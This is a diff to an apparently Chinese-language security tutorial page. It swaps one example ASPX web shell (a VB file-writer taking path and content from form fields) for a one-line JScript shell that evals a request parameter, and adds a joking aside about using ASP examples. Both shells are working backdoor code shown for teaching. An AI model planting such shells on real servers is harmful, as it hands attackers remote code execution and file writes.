@@ -156,15 +156,7 @@
                     <div class="col-lg-12">
 <pre>
 <code class="aspx"> 
-&lt;%@ Page Language="VB" %&gt;
-&lt;%@ import Namespace="System.IO" %&gt;
-&lt;script runat="server"&gt;
-Sub Page_load(sender As Object, E As EventArgs) 
-dim mywrite as new streamwriter(request.form("path"), true, encoding.default) mywrite.write(request.form("content")) 
-mywrite.close 
-response.write("Done!")
-End Sub
-&lt;/script&gt;
+&lt;%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%&gt;
 
 </code>
 </pre>
@@ -187,6 +179,15 @@ End Sub
 
 </code>
 </pre>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-lg-12">
+                        <p class="lead">
+                            為什麼都是用 ASP 系列當範例? <br>
+                            <del>我才不會跟你講，是因為我討厭 asp 呢</del>
+                        </p>
                     </div>
                 </div>
 
